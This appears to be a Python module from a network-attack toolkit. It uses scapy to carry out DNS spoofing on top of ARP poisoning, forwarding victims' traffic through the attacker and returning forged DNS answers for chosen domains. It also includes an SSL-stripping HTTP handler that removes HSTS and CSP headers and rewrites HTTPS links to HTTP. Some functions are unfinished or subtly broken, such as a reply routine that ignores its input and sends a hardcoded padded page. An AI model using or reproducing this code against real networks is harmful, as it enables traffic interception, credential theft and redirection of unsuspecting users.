from attacks.arp_spoof import ARPAttackSettings
from dataclasses import dataclass
from scapy.all import *
from util import Interface

@dataclass
class DNSEntry:
    url: str
    type: str
    ip: str

@dataclass
class DNSAttackSettings:
    arp_settings: ARPAttackSettings
    dns_rules: list[DNSEntry]

def forward_packet(settings: ARPAttackSettings, packet: Packet):
    interface = settings.interface
    victims = settings.sources
    gateway = settings.destinations[0]

    # We can only forward packets if we know where it should go
    if (not (Ether in packet and IP in packet)
       # Skip packets that are not addressed to our interface
       or (packet[Ether].dst != interface.mac_addr.lower())
       # Don't forward packets that we sent
       or (packet[IP].src == interface.ip_addr)
       # Don't forward packets that are sent to us
       or (packet[IP].dst == interface.ip_addr)):
        return

    # print(f'Forwarding {packet.summary()}')

    # victim -> gateway
    for victim in victims:
        if packet[IP].src == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = gateway.mac_addr
            # print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

    # gateway -> victim
    for victim in victims:
        if packet[IP].dst == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = victim.mac_addr
            # print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

def handle_packet(settings: DNSAttackSettings, packet: Packet):
    """
    Inspects a packet.

    All packets are forwarded unless we should
    spoof the DNS request in the packet.
    """

    # We only handle packets that have UDP, IP and DNS protocols
    # Packet must contain DNS query and IP layer
    if not (DNS in packet and IP in packet and UDP in packet):
        return forward_packet(settings.arp_settings, packet)

    # check for dns standard query
    if DNSQR not in packet:
        return forward_packet(settings.arp_settings, packet)

    interface = settings.arp_settings.interface

    if Ether in packet and packet[Ether].src == interface.mac_addr:
        return

    query = packet[DNSQR]
    url = query.qname.decode()
    type = query.get_field('qtype').i2repr(query, query.qtype)

    # try to match request with one of our rules
    for rule in settings.dns_rules:
        if is_match(url, type, rule):
            packet[DNS].an = DNSRR(rrname=url, rdata=rule.ip)
            packet[DNS].ancount = 1

            response = Ether() / IP() / UDP() / packet[DNS]
            response[Ether].src = interface.mac_addr
            response[Ether].dst = packet[Ether].src
            response[IP].src = packet[IP].dst
            response[IP].dst = packet[IP].src
            response[UDP].sport = packet[UDP].dport
            response[UDP].dport = packet[UDP].sport

            sendp(response, iface=interface.name, verbose=0)
            return

    # forward the packet if no rule matches
    forward_packet(settings.arp_settings, packet)

def is_match(qname: str, type: str, dns_rule: DNSEntry):
    if dns_rule.type == '*':
        return qname.strip('.') == dns_rule.url.strip('.')
    else:
        return qname.strip('.') == dns_rule.url.strip('.') and type.upper() == dns_rule.type.upper()

def handle_http(settings: ARPAttackSettings, packet: Packet):
    method = None
    host = None
    path = None
    
    headers = { }

    for header in packet[HTTPRequest].fields_desc:
        name = header.real_name
        property_name = header.name

        if property_name == 'Unknown_Headers':
            continue

        value = packet.getfieldval(property_name)

        if value == None:
            continue

        value = value.decode()

        if name.lower() == 'host':
            host = value
        elif name.lower() == 'method':
            method = value
        elif name.lower() == 'path':
            path = value
        else:
            headers[name] = value

    if method.lower() == 'get':
        response = requests.get(f'https://{host}{path}', headers=headers)

        response_headers = response.headers
        response_content = response.content.decode()

        # we need to remove encoding headers as we already decoded the response
        delete_headers = [
            'content-length',
            'content-encoding',
            'transfer-encoding',
            'strict-transport-security',
            'content-security-policy']

        for delete_header in delete_headers:
            if delete_header in response_headers:
                del response_headers[delete_header]

        # replace all https occurences with http
        response_content = response_content.replace('https', 'http')

        http_response = create_http_response(200, response_headers, response_content)

        send_http_response(http_response, packet, settings)

def create_http_response(status, headers, content):
    response = f'HTTP/1.1 {status}\r\n'

    for header, value in headers.items():
        response += f'{header}: {value}\r\n'

    response += f'Content-Length: {len(content) + 2}'

    response += '\r\n'
    response += content
    response += '\r\n\r\n'

    return response

def send_http_response(response: str, packet: Packet, settings: ARPAttackSettings):
    # response_packets = IP() / TCP() / http_response
    fake_response = 'HTTP/1.1 200 OK\x0d\x0aServer: Testserver\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: 291\x0d\x0a\x0d\x0a<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"><html><head><title>Server</title></head><body bgcolor=\"black\" text=\"white\" link=\"blue\" vlink=\"purple\" alink=\"red\"><p><font face=\"Courier\" color=\"blue\">-Server is running' +  ('!' * 1400)  + '</font></p></body></html>'

    response_packets = IP() / TCP() / HTTP(bytes(fake_response, 'utf-8'))
    response_packets[IP].src = packet[IP].dst
    response_packets[IP].dst = packet[IP].src
    response_packets[TCP].sport = packet[TCP].dport
    response_packets[TCP].dport = packet[TCP].sport
    response_packets[TCP].seq = packet[TCP].ack
    response_packets[TCP].ack = packet[TCP].seq

    response_packets.show()

    print('sending reply')
    sendp(response_packets, iface=settings.interface.name)